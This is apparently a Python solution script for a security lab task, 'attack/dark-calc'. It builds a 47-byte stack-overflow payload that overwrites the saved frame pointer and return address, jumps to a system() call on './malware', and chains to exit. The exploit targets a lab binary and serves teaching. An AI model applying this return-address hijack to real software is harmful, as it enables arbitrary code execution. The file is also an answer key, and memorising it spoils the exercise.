#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

# Fixed addresses (the binary is a non-PIE executable).
CALL_SYSTEM_SITE = 0x401A6B   # eval: mov edi, command_buf; call system@plt
COMMAND_BUF      = 0x6030D0   # global char command_buf[]
EXIT_PLT         = 0x401880   # exit@plt
STACK_TOP        = 0x721000801000   # first byte of the top guard page
SAVED_RBP        = STACK_TOP - 0x10  # 0x721000800ff0


def main() -> None:
    payload = b"./malware\x00"                  # copied into command_buf
    payload += b"A" * (0x10 - len(payload))     # fill expression[16]
    payload += struct.pack("<Q", SAVED_RBP)      # expression[0x10]: saved RBP
    payload += struct.pack("<Q", CALL_SYSTEM_SITE)  # expression[0x18]: ret addr
    payload += struct.pack("<Q", 0)              # expression[0x20]: fake RBP
    payload += struct.pack("<Q", EXIT_PLT)[:7]   # expression[0x28]: exit@plt

    assert len(payload) == 47, len(payload)
    assert b"\x0a" not in payload
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
